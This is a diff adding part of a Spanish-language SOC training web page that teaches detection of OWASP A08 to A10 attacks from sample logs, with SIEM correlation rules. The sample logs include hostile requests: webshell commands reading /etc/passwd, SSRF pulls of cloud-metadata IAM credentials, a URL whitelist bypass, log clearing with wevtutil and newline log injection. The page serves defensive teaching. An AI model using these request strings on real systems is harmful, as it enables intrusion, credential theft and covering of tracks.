+            <div class="sl-line sl-crit"><span class="sl-ln">48</span><span class="sl-lc">Jan 15 08:00:48 CORP-DC01 sshd[12401]: pam_unix(sshd:session): <b>session opened</b> for user admin by (uid=0)</span><span class="sl-tag sl-tag-crit">sesión root</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">49</span><span class="sl-lc">Jan 15 08:01:00 CORP-DC01 sshd[12501]: Failed password for <b>root</b> from 91.213.50.12 port 44100 ssh2</span><span class="sl-tag sl-tag-warn">spray</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">50</span><span class="sl-lc">Jan 15 08:01:01 CORP-DC01 sshd[12502]: Failed password for <b>oracle</b> from 91.213.50.12 port 44101 ssh2</span><span class="sl-tag sl-tag-warn">spray</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">N fallos → 1 éxito</span>La secuencia fallo/éxito desde la misma IP es la firma definitiva del brute force exitoso. ALERT CRÍTICO.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Velocidad imposible para humano</span>1 intento/segundo → bot. Un humano no puede escribir y conectar tan rápido.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">Misma pass, múltiples usuarios</span>Password Spray: 1 contraseña contra admin, root, oracle, etc. — evita bloqueo de cuenta por IP.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">Puerto cambia entre intentos</span>Cada intento SSH usa puerto de origen distinto — confirma que es un script automático.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">COUNT("Failed password") &gt; 5<br>GROUP BY src_ip, user EN &lt; 5min<br>→ BRUTE_FORCE<br><br>"Failed password" SEGUIDO DE "Accepted password"<br>MISMO src_ip EN &lt; 5min → CRÍTICO<br><br>COUNT(distinct user) &gt; 3<br>FROM mismo src_ip EN &lt; 60s → SPRAY</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Usuarios que olvidan su contraseña (generan 3-5 intentos, no 50). IPs de NAT corporativas donde muchos usuarios comparten la misma IP de salida. Scripts de automatización con credenciales caducadas. Establecer umbral y lista blanca de IPs internas.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A08 ════════════════════════════════════ #}
+    <section class="sl-section" id="a08">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-high">A08:2021</span>
+        <h2 class="sl-section-title">Software &amp; Data Integrity Failures</h2>
+        <span class="sl-sev sl-sev-high">ALTO</span>
+        <span class="sl-cat">Malicious Upload · Deserialization · Supply Chain</span>
+      </div>
+      <p class="sl-intro">La aplicación procesa datos sin verificar su integridad. File upload sin validación de extensión permite cargar webshells. La deserialización insegura permite ejecución de código con payloads serializados (ysoserial para Java).</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Apache + App Log — Malicious Upload &amp; Webshell Access</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">10.0.1.5 - user3 [25/Mar/2025:14:10:01 +0000] "POST /upload HTTP/1.1" 200 312 filename="report.pdf"</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">2</span><span class="sl-lc">10.0.1.5 - user3 [25/Mar/2025:14:10:45 +0000] "POST /upload HTTP/1.1" 200 312 filename="<b>shell.php</b>"</span><span class="sl-tag sl-tag-crit">webshell subida</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">203.0.113.99  - - [25/Mar/2025:14:11:02 +0000] "GET <b>/uploads/shell.php?cmd=id</b> HTTP/1.1" 200 28</span><span class="sl-tag sl-tag-crit">webshell exec</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">4</span><span class="sl-lc">203.0.113.99  - - [25/Mar/2025:14:11:05 +0000] "GET /uploads/shell.php?cmd=<b>cat+/etc/passwd</b> HTTP/1.1" 200 2156</span><span class="sl-tag sl-tag-crit">lectura /etc</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">5</span><span class="sl-lc">198.51.100.8  - - [25/Mar/2025:15:00:01 +0000] "POST /api/deserialize HTTP/1.1" 500 891 body="<b>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</b>"</span><span class="sl-tag sl-tag-crit">Java deser</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">.php/.jsp/.aspx en upload</span>Extensiones ejecutables en endpoint de subida de archivos — webshell. Buscar también doble extensión: image.jpg.php.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">GET /uploads/*.php</span>Acceso a un archivo recién subido en el directorio de uploads — ejecución confirmada.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">rO0AB en POST body</span>Magic bytes de Java serializado (base64 de 0xACED). Si el endpoint no debería recibir Java serializado, es un exploit.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">cmd= / exec= en parámetros</span>Parámetros típicos de webshells simplistas.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">POST /upload AND filename ENDS_WITH<br>('.php','.jsp','.asp','.aspx','.sh')<br>AND status=200 → CRÍTICO<br><br>GET /uploads/ AND filename ENDS_WITH<br>('.php','.jsp') → WEBSHELL ACTIVA<br><br>POST body CONTAINS 'rO0AB' (Java serial)<br>OR 'ACED0005' (hex) → DESER ATTACK</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Entornos de desarrollo donde se suben scripts legítimos. Sistemas de gestión de contenido que permiten PHP plugins (WordPress). Crear lista blanca de usuarios con permiso explícito para subir ejecutables y alertar por cualquier otro.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A09 ════════════════════════════════════ #}
+    <section class="sl-section" id="a09">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-high">A09:2021</span>
+        <h2 class="sl-section-title">Security Logging &amp; Monitoring Failures</h2>
+        <span class="sl-sev sl-sev-high">ALTO</span>
+        <span class="sl-cat">Log Deletion · Log Injection · Coverage Gaps</span>
+      </div>
+      <p class="sl-intro">La ausencia de logs es en sí una señal de alerta. Los atacantes eliminan logs para cubrir sus huellas. En Windows, EventID 1102 indica borrado manual del log de Seguridad. Los gaps de tiempo en logs continuos (access.log sin entradas durante 30 min en hora punta) son igualmente sospechosos.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Windows Security Event Log — Log Cleared</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">EventID=4624  2025-03-18T02:10:44Z  Account: svc_maint  LogonType=3  Src: 10.0.5.22</span></div>
+            <div class="sl-line sl-ok"><span class="sl-ln">2</span><span class="sl-lc">EventID=4688  2025-03-18T02:11:01Z  Process: cmd.exe  User: svc_maint</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">EventID=<b>1102</b>  2025-03-18T02:11:15Z  <b>The audit log was cleared</b>  User: svc_maint  Src: 10.0.5.22</span><span class="sl-tag sl-tag-crit">log borrado</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">4</span><span class="sl-lc"><i style="color:#4a5568">[ siguiente entrada: 2025-03-18T03:42:01Z — GAP de 90 minutos ]</i></span><span class="sl-tag sl-tag-warn">gap sospechoso</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">5</span><span class="sl-lc">Apache: 10.0.1.5 - attacker [18/Mar:02:15:33 +0000] "GET /dashboard HTTP/1.1" 200 …<b>\r\n</b>10.0.2.9 - victim [18/Mar:02:15:33 +0000] "GET /logout HTTP/1.1" 200</span><span class="sl-tag sl-tag-warn">log injection</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">EventID 1102</span>Borrado del Security Event Log en Windows. Siempre es intencional — los sistemas legítimos usan 1100 (servicio de auditoría detenido), no 1102.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Gap temporal en log continuo</span>access.log sin entradas durante 30+ min en horario punta — el atacante eliminó o pausó el logging.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">\r\n / %0a en input de usuario</span>Log injection: el atacante inyecta newlines para crear entradas de log falsas o eliminar rastros.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">EventID = 1102 → CRÍTICO INMEDIATO<br>(nunca debería ocurrir en producción)<br><br>GAP(timestamp_actual - timestamp_anterior)<br>&gt; 30min EN hora_punta → ALERTA<br><br>user_input CONTAINS '\r\n' OR '%0a' OR '%0d'<br>→ LOG INJECTION ATTEMPT<br><br>wevtutil cl Security → cmd malicioso</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>EventID 1100 (servicio de auditoría detenido) es parte del shutdown normal — no confundir con 1102. Los gaps pueden ocurrir durante reinicio de servidor o rotación de logs — verificar con logs de sistema si coincide con mantenimiento programado.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A10 ════════════════════════════════════ #}
+    <section class="sl-section" id="a10">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-high">A10:2021</span>
+        <h2 class="sl-section-title">Server-Side Request Forgery (SSRF)</h2>
+        <span class="sl-sev sl-sev-high">ALTO</span>
+        <span class="sl-cat">Cloud Metadata · Internal Network · DNS Rebinding</span>
+      </div>
+      <p class="sl-intro">La aplicación hace peticiones HTTP a URLs controladas por el atacante, permitiendo acceder a recursos internos inaccesibles desde fuera. El indicador más claro: el servidor web hace peticiones salientes a <code>169.254.169.254</code> (metadata de AWS/Azure/GCP) o a rangos RFC 1918.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Proxy / App Log — SSRF hacia metadata de AWS</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">10.0.1.5 - user9 [28/Mar/2025:15:40:01 +0000] "GET /api/fetch?url=https://example.com/logo.png HTTP/1.1" 200 8192</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">2</span><span class="sl-lc">10.0.1.5 - user9 [28/Mar/2025:15:44:01 +0000] "GET /api/fetch?url=<b>http://169.254.169.254/latest/meta-data/</b> HTTP/1.1" 200 312</span><span class="sl-tag sl-tag-crit">AWS metadata</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">10.0.1.5 - user9 [28/Mar/2025:15:44:03 +0000] "GET /api/fetch?url=<b>http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role</b> HTTP/1.1" 200 891</span><span class="sl-tag sl-tag-crit">credenciales IAM</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">4</span><span class="sl-lc">10.0.1.5 - user9 [28/Mar/2025:15:44:10 +0000] "GET /api/fetch?url=<b>http://192.168.0.1/admin</b> HTTP/1.1" 200 4521</span><span class="sl-tag sl-tag-crit">red interna</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">5</span><span class="sl-lc">10.0.1.5 - user9 [28/Mar/2025:15:44:15 +0000] "GET /api/fetch?url=<b>file:///etc/passwd</b> HTTP/1.1" 200 2156</span><span class="sl-tag sl-tag-crit">file:// LFI</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">6</span><span class="sl-lc">10.0.1.5 - user9 [28/Mar/2025:15:44:20 +0000] "GET /api/fetch?url=<b>http://attacker.com@169.254.169.254/</b> HTTP/1.1" 200 312</span><span class="sl-tag sl-tag-crit">bypass whitelist</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">169.254.169.254</span>Dirección de metadata de cloud (AWS, Azure, GCP). Cualquier petición del servidor a esta IP = SSRF confirmado. No hay caso legítimo de aplicación usuario-final accediendo a esta IP.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Peticiones a RFC 1918 desde web</span>El servidor app hace requests a 10.x, 172.16.x, 192.168.x — explorando red interna.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">file:// en parámetros URL</span>Protocolo file:// convierte SSRF en LFI (Local File Inclusion).</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">@ip en URL</span>Técnica de bypass: <code>http://trusted.com@169.254.169.254/</code> — el parser ve trusted.com, la petición va a la IP.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">Petición DESDE app-server<br>A dst_ip = 169.254.169.254 → CRÍTICO<br><br>url_param CONTAINS<br>('169.254','192.168.','10.','172.16.')<br>→ SSRF attempt<br><br>url_param MATCHES 'file://'<br>→ SSRF + LFI<br><br>url_param CONTAINS '@' AND<br>url_param CONTAINS ip_interna → bypass</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Webhooks legítimos que envían a IPs internas (monitorización). Servicios que hacen fetch de URLs externas para preview — necesitan permitlist estricta de dominios. Para 169.254.169.254, prácticamente no hay falso positivo desde aplicaciones web de usuario.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div class="sl-footer">
+      <div class="sl-footer-note">Fuentes: OWASP Top 10 2021 · MITRE ATT&amp;CK · NIST SP 800-92 · CIS Benchmarks</div>
+      <a href="/learn" class="sl-footer-link">← Volver a Learning Center</a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+function slFilterAlerts(btn) {
+    const pre = btn.closest('.sl-log-block').querySelector('.sl-log-pre');
+    const active = pre.classList.toggle('sl-filter-active');
+    btn.textContent = active ? 'Ver todos' : 'Ver solo alertas';
+    btn.classList.toggle('sl-filter-on', active);
+}
+
+// Highlight active nav item on scroll
+const sections = document.querySelectorAll('.sl-section');
+const navLinks  = document.querySelectorAll('.sl-nav-item');
+const observer  = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+        if (e.isIntersecting) {
+            navLinks.forEach(a => a.classList.remove('sl-nav-active'));
+            const a = document.querySelector(`.sl-nav-item[href="#${e.target.id}"]`);
+            if (a) a.classList.add('sl-nav-active');
+        }
+    });
+}, { threshold: 0.3 });
+sections.forEach(s => observer.observe(s));
+</script>
+
+{% endblock %}
